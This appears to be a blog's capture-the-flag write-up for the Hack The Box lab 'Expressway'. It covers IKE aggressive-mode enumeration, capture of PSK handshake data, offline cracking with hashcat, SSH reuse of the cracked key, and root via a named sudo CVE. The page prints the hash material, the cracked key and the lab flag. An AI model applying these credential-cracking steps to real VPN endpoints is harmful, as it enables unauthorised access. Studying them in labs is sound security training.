@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Expressway | whoami</title>
+<meta name="keywords" content="">
+<meta name="description" content="Easy Linux">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/writeups/expressway-easy-linux/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/expressway-easy-linux/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/writeups/expressway-easy-linux/">
+  <meta property="og:site_name" content="whoami">
+  <meta property="og:title" content="Expressway">
+  <meta property="og:description" content="Easy Linux">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Expressway">
+  <meta name="twitter:description" content="Easy Linux">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Write-Ups",
+      "item": "http://localhost:1313/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Expressway",
+      "item": "http://localhost:1313/writeups/expressway-easy-linux/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Expressway",
+  "name": "Expressway",
+  "description": "Easy Linux",
+  "keywords": [
+    
+  ],
+  "articleBody": "nmap scan.\nOnly 22 with the latest SSH version - so maybe a UDP scan?\nPort 500 is open - commonly used for the Internet Key Exchange (IKE) protocol.\nFrom https://community.cisco.com/t5/security-knowledge-base/dead-peer-detection/ta-p/3111324: Dead Peer Detection (DPD) is a method that allows detection of unreachable IKE peers. DPD is described in informational RFC 3706: “A Traffic-Based Method of Detecting Dead Internet Key Exchange (IKE) Peers”. The RFC describes the DPD negotiation procedure and two new ISAKMP NOTIFY messages. DPD requests are sent as ISAKMP R-U-THERE messages, and DPD responses as ISAKMP R-U-THERE-ACK messages.\nIKE is part of the IPsec suite used to establish secure VPN tunnels.\nUsing ike-scan --aggressive:\nStarting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/) 10.129.242.237 Aggressive Mode Handshake returned HDR=(CKY-R=a0b0213b53d2934d) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes) Ending ike-scan 1.9.6: 1 hosts scanned in 0.212 seconds (4.72 hosts/sec). 1 returned handshake; 0 returned notify We see there’s a user ike with email ike@expressway.htb.\nSo, what is a PSK? A Pre-Shared Key is a secret key shared beforehand between the VPN client and server. It’s used in IKE for authenticating and establishing secure VPN tunnels - both sides must have the same PSK to complete the handshake.\nHow does PSK work in IKE? During the IKE handshake, the client and server prove knowledge of the PSK without sending it directly. In Aggressive Mode, some information is sent in cleartext - leaking identities and allowing offline attacks on the PSK. In Main Mode, the PSK is better protected, making offline cracking harder or impossible. In the aggressive mode handshake, the handshake contains: server and client cookies, Security Association (SA) parameters, Key Exchange payload, nonce values, identity payload (leaked in aggressive mode), and a hash derived from the PSK and handshake data.\nWe want to crack the hash offline.\n# Capture handshake data ike-scan --aggressive 10.129.242.237 \u003e handshake.txt Why you can’t just take the “Hash(20 bytes)” from ike-scan output and crack it directly The “Hash(20 bytes)” shown by ike-scan is part of the IKE Aggressive Mode handshake payload - specifically the AUTH payload hash. It’s not the raw PSK or a simple hash of the PSK. Instead, it’s a keyed hash (HMAC) computed using the PSK combined with multiple handshake values (nonces, cookies, identities, DH values). The hash depends on the unknown PSK and other handshake data, so you can’t crack that single hash value directly without the full handshake parameters and reconstructing the hash calculation. Good resource for IKE pen testing: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/\nike-scan 10.129.242.237 -M -A -P --id=ike@expressway.htb Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/) 10.129.242.237 Aggressive Mode Handshake returned HDR=(CKY-R=91a72b59e48e2212) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes) IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r): 352bcc9ad50b0522f2055de0a3c95b31000922ee70985730b66b5e68b0fd2d001ef68f5baf86ba8f75a8de9e83c1564d3d494b49a7ed86a4cc936e5ac4e142bbf15fc31f99720157259a821682481e2c23cdf0e50c857208ae46fa850da2f3ffa925b0a755d147aa265f8e2ffb884881cb8f34a3a31f94479562c2dd93562256:29b142bab7208fd968b481feb4da5579103f4a8879c0c2f4c826df6384e40c3d74144e7c2dfb2788799d00a9abbf249b7baa0b6608094515f5b1a90d34c4295063dc67ebf775707fdcc98d10dedb658c17221518265aec4b71a1ea781f5495d2a0725dc206dd2921be22e1151bb42a6fb1d1ef7a4776f554c66fd9dc3fbd1461:91a72b59e48e2212:3d211d9881e1758b:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:a54131612798182f011368da715318a9d9adfc89:256f6cdb4d07f9abd7d56044a31265a9d3dae83496d1549eea47b9049324d8d7:39cf7f5fd7a5b6ac7b53ffda070d456548388fac Ending ike-scan 1.9.6: 1 hosts scanned in 0.217 seconds (4.60 hosts/sec). 1 returned handshake; 0 returned notify Note that --id= has to be the correct value because the hash process involves the id - in aggressive mode we were able to get the id value, so we use that.\nWhat is this? The full handshake data needed for offline PSK cracking. Each colon-separated field corresponds to a specific IKE handshake value: g_xr, g_xi: Diffie-Hellman public keys (responder and initiator) cky_r, cky_i: Cookies (responder and initiator) sai_b: Security Association payload (binary) idir_b: Initiator ID payload (binary) ni_b, nr_b: Nonces (initiator and responder) hash_r: The hash from the responder (the AUTH hash) hash.txt file content:\n352bcc9ad50b0522f2055de0a3c95b31000922ee70985730b66b5e68b0fd2d001ef68f5baf86ba8f75a8de9e83c1564d3d494b49a7ed86a4cc936e5ac4e142bbf15fc31f99720157259a821682481e2c23cdf0e50c857208ae46fa850da2f3ffa925b0a755d147aa265f8e2ffb884881cb8f34a3a31f94479562c2dd93562256:29b142bab7208fd968b481feb4da5579103f4a8879c0c2f4c826df6384e40c3d74144e7c2dfb2788799d00a9abbf249b7baa0b6608094515f5b1a90d34c4295063dc67ebf775707fdcc98d10dedb658c17221518265aec4b71a1ea781f5495d2a0725dc206dd2921be22e1151bb42a6fb1d1ef7a4776f554c66fd9dc3fbd1461:91a72b59e48e2212:3d211d9881e1758b:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:a54131612798182f011368da715318a9d9adfc89:256f6cdb4d07f9abd7d56044a31265a9d3dae83496d1549eea47b9049324d8d7:39cf7f5fd7a5b6ac7b53ffda070d456548388fac hashcat -m 5400 hash_psk.txt /usr/share/wordlists/rockyou.txt # and we get a crack hashcat -m 5400 hash_psk.txt --show It cracks to freakingrockstarontheroad.\nThis PSK would generally be used to authenticate to the VPN/IPsec server with a VPN client - but trying it on SSH works too.\nuser.txt - fc818b19372f2b83bc428dbb5f76fef0\nWe see we’re part of a group proxy:\nfind / -group proxy 2\u003e\u00261 | grep -v \"Permission denied\" (2\u003e\u00261 redirects stderr to stdout so we can grep it.)\nWe find something related to squid.\nSquid is a high-performance caching proxy server - it stores and serves frequently requested web content from a local cache, reducing network traffic and improving response times. Squid supports HTTP, HTTPS, and FTP.\nThe process is running:\nDownloaded the log and cache files in /var/log/squid.\nRunning linpeas…\n╔══════════╣ Analyzing Htpasswd Files (limit 70) -rw-r--r-- 1 root root 47 Apr 25 2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/ -rw-r--r-- 1 root root 47 Apr 25 2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR. -rw-r--r-- 1 root root 117 Apr 25 2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd username:digest anon:25e4077a9344ceb1a88f2a62c9fb60d8 05bbb04 anonymous:digest anon:faa4e5870970cf935bb9674776e6b26a -rw-r--r-- 1 root root 62 Apr 25 2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04 -rw-r--r-- 1 root root 62 Apr 25 2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04 -rw-r--r-- 1 root root 62 Apr 25 2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30 4105bbb04 Stupid mistake time - I was using an older version of linpeas. You know what’s new that won’t get shown? New vulnerabilities.\nRunning a newer version of linpeas, the sudo version shows up red. Searching for an exploit on sudo version 1.9.17 finds a new vulnerability - CVE-2025-32463 (chwoot).\nRunning the script on the box gives us root.\n",
+  "wordCount" : "844",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/expressway-easy-linux/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "whoami",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="whoami (Alt + H)">whoami</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/htb/" title="HTB">
+                    <span>HTB</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Expressway
+    </h1>
+    <div class="post-description">
+      Easy Linux
+    </div>
+  </header> 
+  <div class="post-content md-content"><p><strong>nmap</strong> scan.</p>
+<p><img alt="Expressway (Easy Linux).png" loading="lazy" src="/writeups/expressway-easy-linux/Expressway%20%28Easy%20Linux%29.png"></p>
+<p>Only 22 with the latest SSH version - so maybe a UDP scan?</p>
+<p><img alt="Expressway (Easy Linux)-1.png" loading="lazy" src="/writeups/expressway-easy-linux/Expressway%20%28Easy%20Linux%29-1.png"></p>
+<p>Port 500 is open - commonly used for the Internet Key Exchange (IKE) protocol.</p>
+<p>From <a href="https://community.cisco.com/t5/security-knowledge-base/dead-peer-detection/ta-p/3111324">https://community.cisco.com/t5/security-knowledge-base/dead-peer-detection/ta-p/3111324</a>: Dead Peer Detection (DPD) is a method that allows detection of unreachable IKE peers. DPD is described in informational RFC 3706: &ldquo;A Traffic-Based Method of Detecting Dead Internet Key Exchange (IKE) Peers&rdquo;. The RFC describes the DPD negotiation procedure and two new ISAKMP NOTIFY messages. DPD requests are sent as ISAKMP R-U-THERE messages, and DPD responses as ISAKMP R-U-THERE-ACK messages.</p>
+<p>IKE is part of the IPsec suite used to establish secure VPN tunnels.</p>
+<p>Using <code>ike-scan --aggressive</code>:</p>
+<p><img alt="Expressway (Easy Linux)-2.png" loading="lazy" src="/writeups/expressway-easy-linux/Expressway%20%28Easy%20Linux%29-2.png"></p>
+<pre tabindex="0"><code>Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.242.237  Aggressive Mode Handshake returned HDR=(CKY-R=a0b0213b53d2934d) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.212 seconds (4.72 hosts/sec).  1 returned handshake; 0 returned notify
+</code></pre><p>We see there&rsquo;s a user <code>ike</code> with email <code>ike@expressway.htb</code>.</p>
+<p>So, what is a PSK? A Pre-Shared Key is a secret key shared beforehand between the VPN client and server. It&rsquo;s used in IKE for authenticating and establishing secure VPN tunnels - both sides must have the same PSK to complete the handshake.</p>
+<h3 id="how-does-psk-work-in-ike">How does PSK work in IKE?<a hidden class="anchor" aria-hidden="true" href="#how-does-psk-work-in-ike">#</a></h3>
+<ul>
+<li>During the IKE handshake, the client and server prove knowledge of the PSK without sending it directly.</li>
+<li>In <strong>Aggressive Mode</strong>, some information is sent in cleartext - leaking identities and allowing offline attacks on the PSK.</li>
+<li>In <strong>Main Mode</strong>, the PSK is better protected, making offline cracking harder or impossible.</li>
+</ul>
+<p>In the aggressive mode handshake, the handshake contains: server and client cookies, Security Association (SA) parameters, Key Exchange payload, nonce values, identity payload (leaked in aggressive mode), and a hash derived from the PSK and handshake data.</p>
+<p>We want to crack the hash offline.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Capture handshake data</span>
+</span></span><span class="line"><span class="cl">ike-scan --aggressive 10.129.242.237 &gt; handshake.txt
+</span></span></code></pre></div><h3 id="why-you-cant-just-take-the-hash20-bytes-from-ike-scan-output-and-crack-it-directly">Why you can&rsquo;t just take the &ldquo;Hash(20 bytes)&rdquo; from ike-scan output and crack it directly<a hidden class="anchor" aria-hidden="true" href="#why-you-cant-just-take-the-hash20-bytes-from-ike-scan-output-and-crack-it-directly">#</a></h3>
+<ul>
+<li>The &ldquo;Hash(20 bytes)&rdquo; shown by ike-scan is part of the IKE Aggressive Mode handshake payload - specifically the AUTH payload hash.</li>
+<li>It&rsquo;s not the raw PSK or a simple hash of the PSK. Instead, it&rsquo;s a keyed hash (HMAC) computed using the PSK combined with multiple handshake values (nonces, cookies, identities, DH values).</li>
+<li>The hash depends on the unknown PSK and other handshake data, so you can&rsquo;t crack that single hash value directly without the full handshake parameters and reconstructing the hash calculation.</li>
+</ul>
+<p>Good resource for IKE pen testing: <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/">https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/</a></p>
+<p><img alt="Expressway (Easy Linux)-4.png" loading="lazy" src="/writeups/expressway-easy-linux/Expressway%20%28Easy%20Linux%29-4.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ike-scan 10.129.242.237 -M -A -P --id<span class="o">=</span>ike@expressway.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Starting ike-scan 1.9.6 with <span class="m">1</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/ike-scan/<span class="o">)</span>
+</span></span><span class="line"><span class="cl">10.129.242.237  Aggressive Mode Handshake returned
+</span></span><span class="line"><span class="cl">        <span class="nv">HDR</span><span class="o">=(</span>CKY-R<span class="o">=</span>91a72b59e48e2212<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">SA</span><span class="o">=(</span><span class="nv">Enc</span><span class="o">=</span>3DES <span class="nv">Hash</span><span class="o">=</span>SHA1 <span class="nv">Group</span><span class="o">=</span>2:modp1024 <span class="nv">Auth</span><span class="o">=</span>PSK <span class="nv">LifeType</span><span class="o">=</span>Seconds <span class="nv">LifeDuration</span><span class="o">=</span>28800<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        KeyExchange<span class="o">(</span><span class="m">128</span> bytes<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        Nonce<span class="o">(</span><span class="m">32</span> bytes<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        ID<span class="o">(</span><span class="nv">Type</span><span class="o">=</span>ID_USER_FQDN, <span class="nv">Value</span><span class="o">=</span>ike@expressway.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">VID</span><span class="o">=</span>09002689dfd6b712 <span class="o">(</span>XAUTH<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">VID</span><span class="o">=</span>afcad71368a1f1c96b8696fc77570100 <span class="o">(</span>Dead Peer Detection v1.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        Hash<span class="o">(</span><span class="m">20</span> bytes<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">IKE PSK parameters <span class="o">(</span>g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">352bcc9ad50b0522f2055de0a3c95b31000922ee70985730b66b5e68b0fd2d001ef68f5baf86ba8f75a8de9e83c1564d3d494b49a7ed86a4cc936e5ac4e142bbf15fc31f99720157259a821682481e2c23cdf0e50c857208ae46fa850da2f3ffa925b0a755d147aa265f8e2ffb884881cb8f34a3a31f94479562c2dd93562256:29b142bab7208fd968b481feb4da5579103f4a8879c0c2f4c826df6384e40c3d74144e7c2dfb2788799d00a9abbf249b7baa0b6608094515f5b1a90d34c4295063dc67ebf775707fdcc98d10dedb658c17221518265aec4b71a1ea781f5495d2a0725dc206dd2921be22e1151bb42a6fb1d1ef7a4776f554c66fd9dc3fbd1461:91a72b59e48e2212:3d211d9881e1758b:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:a54131612798182f011368da715318a9d9adfc89:256f6cdb4d07f9abd7d56044a31265a9d3dae83496d1549eea47b9049324d8d7:39cf7f5fd7a5b6ac7b53ffda070d456548388fac
+</span></span><span class="line"><span class="cl">Ending ike-scan 1.9.6: <span class="m">1</span> hosts scanned in 0.217 seconds <span class="o">(</span>4.60 hosts/sec<span class="o">)</span>.  <span class="m">1</span> returned handshake<span class="p">;</span> <span class="m">0</span> returned notify
+</span></span></code></pre></div><p>Note that <code>--id=</code> has to be the correct value because the hash process involves the id - in aggressive mode we were able to get the id value, so we use that.</p>
+<h3 id="what-is-this">What is this?<a hidden class="anchor" aria-hidden="true" href="#what-is-this">#</a></h3>
+<ul>
+<li>The full handshake data needed for offline PSK cracking.</li>
+<li>Each colon-separated field corresponds to a specific IKE handshake value:
+<ul>
+<li><code>g_xr</code>, <code>g_xi</code>: Diffie-Hellman public keys (responder and initiator)</li>
+<li><code>cky_r</code>, <code>cky_i</code>: Cookies (responder and initiator)</li>
+<li><code>sai_b</code>: Security Association payload (binary)</li>
+<li><code>idir_b</code>: Initiator ID payload (binary)</li>
+<li><code>ni_b</code>, <code>nr_b</code>: Nonces (initiator and responder)</li>
+<li><code>hash_r</code>: The hash from the responder (the AUTH hash)</li>
+</ul>
+</li>
+</ul>
+<p>hash.txt file content:</p>
+<pre tabindex="0"><code>352bcc9ad50b0522f2055de0a3c95b31000922ee70985730b66b5e68b0fd2d001ef68f5baf86ba8f75a8de9e83c1564d3d494b49a7ed86a4cc936e5ac4e142bbf15fc31f99720157259a821682481e2c23cdf0e50c857208ae46fa850da2f3ffa925b0a755d147aa265f8e2ffb884881cb8f34a3a31f94479562c2dd93562256:29b142bab7208fd968b481feb4da5579103f4a8879c0c2f4c826df6384e40c3d74144e7c2dfb2788799d00a9abbf249b7baa0b6608094515f5b1a90d34c4295063dc67ebf775707fdcc98d10dedb658c17221518265aec4b71a1ea781f5495d2a0725dc206dd2921be22e1151bb42a6fb1d1ef7a4776f554c66fd9dc3fbd1461:91a72b59e48e2212:3d211d9881e1758b:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:a54131612798182f011368da715318a9d9adfc89:256f6cdb4d07f9abd7d56044a31265a9d3dae83496d1549eea47b9049324d8d7:39cf7f5fd7a5b6ac7b53ffda070d456548388fac
+</code></pre><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">5400</span> hash_psk.txt /usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># and we get a crack</span>
+</span></span><span class="line"><span class="cl">hashcat -m <span class="m">5400</span> hash_psk.txt --show
+</span></span></code></pre></div><p><img alt="Expressway (Easy Linux)-5.png" loading="lazy" src="/writeups/expressway-easy-linux/Expressway%20%28Easy%20Linux%29-5.png"></p>
+<p>It cracks to <code>freakingrockstarontheroad</code>.</p>
+<p>This PSK would generally be used to authenticate to the VPN/IPsec server with a VPN client - but trying it on SSH works too.</p>
+<p><img alt="Expressway (Easy Linux)-6.png" loading="lazy" src="/writeups/expressway-easy-linux/Expressway%20%28Easy%20Linux%29-6.png"></p>
+<p>user.txt - <code>fc818b19372f2b83bc428dbb5f76fef0</code></p>
+<p><img alt="Expressway (Easy Linux)-7.png" loading="lazy" src="/writeups/expressway-easy-linux/Expressway%20%28Easy%20Linux%29-7.png"></p>
+<p>We see we&rsquo;re part of a group <code>proxy</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -group proxy 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep -v <span class="s2">&#34;Permission denied&#34;</span>
+</span></span></code></pre></div><p>(<code>2&gt;&amp;1</code> redirects stderr to stdout so we can grep it.)</p>
+<p>We find something related to squid.</p>
+<p><img alt="Expressway (Easy Linux)-8.png" loading="lazy" src="/writeups/expressway-easy-linux/Expressway%20%28Easy%20Linux%29-8.png"></p>
+<p>Squid is a high-performance caching proxy server - it stores and serves frequently requested web content from a local cache, reducing network traffic and improving response times. Squid supports HTTP, HTTPS, and FTP.</p>
+<p>The process is running:</p>
+<p><img alt="Expressway (Easy Linux)-9.png" loading="lazy" src="/writeups/expressway-easy-linux/Expressway%20%28Easy%20Linux%29-9.png"></p>
+<p>Downloaded the log and cache files in <code>/var/log/squid</code>.</p>
+<p>Running linpeas&hellip;</p>
+<pre tabindex="0"><code>╔══════════╣ Analyzing Htpasswd Files (limit 70)       
+-rw-r--r-- 1 root root 47 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd
+username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/
+-rw-r--r-- 1 root root 47 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd
+username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR.
+-rw-r--r-- 1 root root 117 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd
+username:digest anon:25e4077a9344ceb1a88f2a62c9fb60d8
+05bbb04           
+anonymous:digest anon:faa4e5870970cf935bb9674776e6b26a
+-rw-r--r-- 1 root root 62 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd
+username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
+-rw-r--r-- 1 root root 62 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd
+username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
+-rw-r--r-- 1 root root 62 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd
+username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30     
+4105bbb04  
+</code></pre><p><img alt="Expressway (Easy Linux)-10.png" loading="lazy" src="/writeups/expressway-easy-linux/Expressway%20%28Easy%20Linux%29-10.png"></p>
+<p>Stupid mistake time - I was using an older version of linpeas. You know what&rsquo;s new that won&rsquo;t get shown? New vulnerabilities.</p>
+<p>Running a newer version of linpeas, the sudo version shows up red. Searching for an exploit on sudo version <code>1.9.17</code> finds a new vulnerability - CVE-2025-32463 (chwoot).</p>
+<p>Running the script on the box gives us root.</p>
+<p><img alt="Expressway (Easy Linux)-11.png" loading="lazy" src="/writeups/expressway-easy-linux/Expressway%20%28Easy%20Linux%29-11.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">whoami</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
